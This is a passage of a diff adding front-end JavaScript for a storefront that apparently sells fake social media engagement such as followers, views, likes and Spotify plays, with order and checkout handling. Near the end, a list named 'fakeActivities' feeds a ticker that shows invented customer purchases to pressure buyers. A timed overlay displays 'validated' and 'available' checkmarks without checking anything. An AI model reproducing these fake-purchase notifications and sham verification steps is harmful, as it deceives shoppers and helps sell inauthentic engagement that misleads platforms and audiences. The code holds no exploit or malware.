+                Object.entries(navButtons).forEach(([key, btnId]) => {
+                    const btn = document.getElementById(btnId);
+                    if (btn) {
+                        if (key === page) {
+                            btn.classList.add('active');
+                        } else {
+                            btn.classList.remove('active');
+                        }
+                    }
+                });
+
+                currentPage = page;
+            }, currentPage === page ? 0 : 300);
+        }
+
+        function toggleMobileMenu() {
+            const menu = document.getElementById('mobileMenu');
+            mobileMenuOpen = !mobileMenuOpen;
+            if (mobileMenuOpen) {
+                menu.classList.add('open');
+            } else {
+                menu.classList.remove('open');
+            }
+        }
+
+        // ========================
+        // Category Change Handler
+        // ========================
+        document.getElementById('serviceCategory').addEventListener('change', function() {
+            const category = this.value;
+            const serviceSelect = document.getElementById('serviceSelect');
+            const serviceList = services[category] || [];
+
+            serviceSelect.innerHTML = '<option value="" disabled selected>Select a service...</option>';
+            serviceList.forEach(service => {
+                const option = document.createElement('option');
+                option.value = service.id;
+                option.textContent = service.name;
+                serviceSelect.appendChild(option);
+            });
+
+            serviceSelect.disabled = false;
+            currentService = null;
+            document.getElementById('serviceInfo').classList.add('hidden');
+            updateCharge();
+        });
+
+        // ========================
+        // Service Change Handler
+        // ========================
+        document.getElementById('serviceSelect').addEventListener('change', function() {
+            const category = document.getElementById('serviceCategory').value;
+            const serviceId = this.value;
+            const serviceList = services[category] || [];
+            currentService = serviceList.find(s => s.id === serviceId);
+
+            if (currentService) {
+                document.getElementById('serviceInfo').classList.remove('hidden');
+                document.getElementById('serviceRate').innerHTML = `<span class="price-currency">$</span>${currentService.rate.toFixed(2)} / 1K`;
+                document.getElementById('serviceMin').textContent = currentService.min.toLocaleString();
+                document.getElementById('serviceMax').textContent = currentService.max.toLocaleString();
+
+                const quantityInput = document.getElementById('quantityInput');
+                quantityInput.min = currentService.min;
+                quantityInput.max = currentService.max;
+                if (parseInt(quantityInput.value) < currentService.min) quantityInput.value = currentService.min;
+                if (parseInt(quantityInput.value) > currentService.max) quantityInput.value = currentService.max;
+                updateCharge();
+            }
+        });
+
+        // ========================
+        // Quantity Handlers
+        // ========================
+        document.getElementById('quantityInput').addEventListener('input', updateCharge);
+
+        function adjustQuantity(amount) {
+            const input = document.getElementById('quantityInput');
+            let value = parseInt(input.value) || 0;
+            value += amount;
+            if (currentService) {
+                value = Math.max(currentService.min, Math.min(currentService.max, value));
+            } else {
+                value = Math.max(100, value);
+            }
+            input.value = value;
+            updateCharge();
+        }
+
+        function updateCharge() {
+            const quantity = parseInt(document.getElementById('quantityInput').value) || 0;
+            const chargeEl = document.getElementById('totalCharge');
+            if (currentService) {
+                const total = (quantity / 1000) * currentService.rate;
+                chargeEl.innerHTML = `<span class="price-currency">$</span>${total.toFixed(2)}`;
+            } else {
+                chargeEl.innerHTML = '<span class="price-currency">$</span>0.00';
+            }
+            chargeEl.classList.remove('charge-update');
+            void chargeEl.offsetWidth;
+            chargeEl.classList.add('charge-update');
+        }
+
+        // ========================
+        // Toast Notification
+        // ========================
+        function showToast(type, title, message) {
+            const toast = document.getElementById('toast');
+            const icon = document.getElementById('toastIcon');
+            document.getElementById('toastTitle').textContent = title;
+            document.getElementById('toastMessage').textContent = message;
+
+            const configs = {
+                error: { svg:'<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>', color:'red' },
+                success: { svg:'<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>', color:'emerald' },
+                info: { svg:'<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/>', color:'blue' }
+            };
+            const c = configs[type] || configs.info;
+            icon.innerHTML = `<svg class="w-4 h-4 text-${c.color}-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">${c.svg}</svg>`;
+            icon.className = `w-8 h-8 rounded-lg flex items-center justify-center bg-${c.color}-500/10`;
+
+            toast.classList.remove('translate-y-20','opacity-0','pointer-events-none');
+            toast.classList.add('translate-y-0','opacity-100','pointer-events-auto');
+            setTimeout(() => {
+                toast.classList.add('translate-y-20','opacity-0','pointer-events-none');
+                toast.classList.remove('translate-y-0','opacity-100','pointer-events-auto');
+            }, 4000);
+        }
+
+        // ========================
+        // PROCESSING ANIMATION
+        // ========================
+        function showProcessingOverlay() {
+            return new Promise((resolve) => {
+                const overlay = document.getElementById('processingOverlay');
+                const barFill = document.getElementById('processingBarFill');
+                const step1 = document.getElementById('procStep1');
+                const step2 = document.getElementById('procStep2');
+                const step3 = document.getElementById('procStep3');
+                const spinner1 = document.getElementById('procSpinner1');
+                const spinner2 = document.getElementById('procSpinner2');
+                const spinner3 = document.getElementById('procSpinner3');
+                const text1 = document.getElementById('procText1');
+                const text2 = document.getElementById('procText2');
+                const text3 = document.getElementById('procText3');
+
+                barFill.style.animation = 'none';
+                void barFill.offsetWidth;
+                barFill.style.animation = '';
+
+                step1.className = 'processing-step active';
+                step2.className = 'processing-step';
+                step3.className = 'processing-step';
+                spinner1.style.opacity = '1';
+                spinner2.style.opacity = '0';
+                spinner3.style.opacity = '0';
+                text1.textContent = 'Validating order details...';
+                text2.textContent = 'Checking service availability...';
+                text3.textContent = 'Preparing secure checkout...';
+
+                overlay.classList.add('active');
+                barFill.style.animation = 'barFill 2.2s cubic-bezier(0.4,0,0.2,1) forwards, barShimmer 1.5s ease-in-out infinite';
+
+                setTimeout(() => {
+                    spinner1.style.opacity = '0';
+                    spinner1.outerHTML = '<svg class="w-4 h-4 text-emerald-400 check-appear" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>';
+                    text1.textContent = 'Order validated ✓';
+                    text1.classList.add('text-emerald-400');
+                    step1.classList.add('done');
+                    step2.classList.add('active');
+                    spinner2.style.opacity = '1';
+                }, 700);
+
+                setTimeout(() => {
+                    spinner2.style.opacity = '0';
+                    spinner2.outerHTML = '<svg class="w-4 h-4 text-emerald-400 check-appear" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>';
+                    text2.textContent = 'Service available ✓';
+                    text2.classList.add('text-emerald-400');
+                    step2.classList.add('done');
+                    step3.classList.add('active');
+                    spinner3.style.opacity = '1';
+                }, 1400);
+
+                setTimeout(() => {
+                    spinner3.style.opacity = '0';
+                    spinner3.outerHTML = '<svg class="w-4 h-4 text-emerald-400 check-appear" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>';
+                    text3.textContent = 'Checkout ready ✓';
+                    text3.classList.add('text-emerald-400');
+                    step3.classList.add('done');
+                }, 2000);
+
+                setTimeout(() => {
+                    overlay.classList.remove('active');
+                    setTimeout(() => {
+                        document.querySelectorAll('#processingOverlay .check-appear').forEach(el => {
+                            const spinner = document.createElement('div');
+                            spinner.className = 'spinner';
+                            spinner.style.cssText = 'width:14px;height:14px;border-width:2px;opacity:0;';
+                            el.replaceWith(spinner);
+                        });
+                        text1.classList.remove('text-emerald-400');
+                        text2.classList.remove('text-emerald-400');
+                        text3.classList.remove('text-emerald-400');
+                    }, 500);
+                    resolve();
+                }, 2500);
+            });
+        }
+
+        // ========================
+        // Confirm Order
+        // ========================
+        async function confirmOrder() {
+            const category = document.getElementById('serviceCategory').value;
+            const service = document.getElementById('serviceSelect').value;
+            const link = document.getElementById('linkInput').value.trim();
+            const quantity = parseInt(document.getElementById('quantityInput').value) || 0;
+
+            if (!category) { showToast('error','Missing Field','Please select a service category.'); return; }
+            if (!service) { showToast('error','Missing Field','Please select a service.'); return; }
+            if (!link) { showToast('error','Missing Field','Please enter a valid link.'); return; }
+            if (!link.startsWith('http://') && !link.startsWith('https://')) {
+                showToast('error','Invalid Link','Link must start with http:// or https://'); return;
+            }
+            if (currentService && (quantity < currentService.min || quantity > currentService.max)) {
+                showToast('error','Invalid Quantity',`Quantity must be between ${currentService.min.toLocaleString()} and ${currentService.max.toLocaleString()}.`); return;
+            }
+
+            const total = currentService ? ((quantity / 1000) * currentService.rate).toFixed(2) : '0.00';
+            orderData = {
+                category, service: currentService ? currentService.name : service,
+                link, quantity, total,
+            };
+
+            const orderSection = document.getElementById('orderSection');
+            orderSection.classList.remove('section-enter');
+            orderSection.classList.add('section-exit');
+
+            setTimeout(async () => {
+                orderSection.style.display = 'none';
+                await showProcessingOverlay();
+
+                const paymentSection = document.getElementById('paymentSection');
+                paymentSection.style.display = 'block';
+                paymentSection.classList.remove('section-exit');
+                paymentSection.classList.add('section-enter');
+
+                updateStepIndicators(2);
+                document.getElementById('pageTitle').textContent = 'Secure Checkout';
+                document.getElementById('pageSubtitle').textContent = `Complete payment of $${total} USD to finalize your order.`;
+
+                Object.values(navButtons).forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.classList.remove('active');
+                });
+
+                currentPage = 'payment';
+            }, 300);
+        }
+
+        // ========================
+        // Step Indicators
+        // ========================
+        function updateStepIndicators(step) {
+            const s1c = document.getElementById('step1Circle');
+            const s1t = document.getElementById('step1Text');
+            const s2c = document.getElementById('step2Circle');
+            const s2t = document.getElementById('step2Text');
+            const prog = document.getElementById('stepProgress');
+
+            if (step === 2) {
+                s1c.className = 'w-8 h-8 rounded-full bg-emerald-500 flex items-center justify-center text-white text-xs font-bold transition-all duration-300';
+                s1c.innerHTML = '<svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/></svg>';
+                s1t.className = 'text-sm font-medium text-emerald-400 transition-all duration-300';
+                s2c.className = 'w-8 h-8 rounded-full bg-ava-accent flex items-center justify-center text-white text-xs font-bold transition-all duration-300';
+                s2c.textContent = '2';
+                s2t.className = 'text-sm font-medium text-white transition-all duration-300';
+                prog.style.transform = 'scaleX(1)';
+            } else {
+                s1c.className = 'w-8 h-8 rounded-full bg-ava-accent flex items-center justify-center text-white text-xs font-bold transition-all duration-300';
+                s1c.innerHTML = '1';
+                s1t.className = 'text-sm font-medium text-white transition-all duration-300';
+                s2c.className = 'w-8 h-8 rounded-full bg-ava-card border border-ava-border flex items-center justify-center text-ava-textMuted text-xs font-bold transition-all duration-300';
+                s2c.textContent = '2';
+                s2t.className = 'text-sm font-medium text-ava-textMuted transition-all duration-300';
+                prog.style.transform = 'scaleX(0)';
+            }
+        }
+
+        // ========================
+        // RECENT ACTIVITY TICKER
+        // ========================
+        const fakeActivities = [
+            { user:'User38***', action:'just bought 10K IG Followers for $2.00' },
+            { user:'Alex9***', action:'ordered 50K TikTok Views for $5.00' },
+            { user:'Mia_2***', action:'purchased 5K YouTube Subs for $4.00' },
+            { user:'Jake7***', action:'got 100K IG Reel Views for $10.00' },
+            { user:'Sara1***', action:'bought 2K Twitter Followers for $0.60' },
+            { user:'Dev_x***', action:'ordered 10K Telegram Members for $2.50' },
+            { user:'Luna4***', action:'purchased 50K Spotify Plays for $5.00' },
+            { user:'Max_8***', action:'just got 5K IG Likes for $0.60' },
+            { user:'Zoe_3***', action:'bought 10K FB Page Likes for $3.00' },
+            { user:'Ryan5***', action:'ordered 2K Discord Members for $0.80' },
+            { user:'Nia_7***', action:'purchased 1M TikTok Views for $100' },
+            { user:'Leo_1***', action:'just got 100K YT Views for $10.00' },
+            { user:'Kim_6***', action:'bought 500 IG Comments for $0.40' },
+            { user:'Jay_4***', action:'ordered 10K Twitter Likes for $1.50' },
+            { user:'Ella2***', action:'purchased 100K Spotify Plays for $10' },
+        ];
+
+        let tickerIndex = 0;
+        let tickerTimeout;
+
+        function showActivityTicker() {
+            const ticker = document.getElementById('activityTicker');
+            const activity = fakeActivities[tickerIndex % fakeActivities.length];
+
+            document.getElementById('tickerUser').textContent = activity.user;
+            document.getElementById('tickerAction').textContent = activity.action;
+
+            ticker.classList.remove('hide');
+            ticker.classList.add('show');
+
+            clearTimeout(tickerTimeout);
+            tickerTimeout = setTimeout(() => {
+                ticker.classList.remove('show');
+                ticker.classList.add('hide');
+                tickerIndex++;
+                setTimeout(showActivityTicker, 3000 + Math.random() * 5000);
+            }, 4000);
+        }
+
+        setTimeout(showActivityTicker, 5000);
+
+        // ========================
+        // Initialize
+        // ========================
+        updateCharge();
+    </script>
+</body>
+</html>
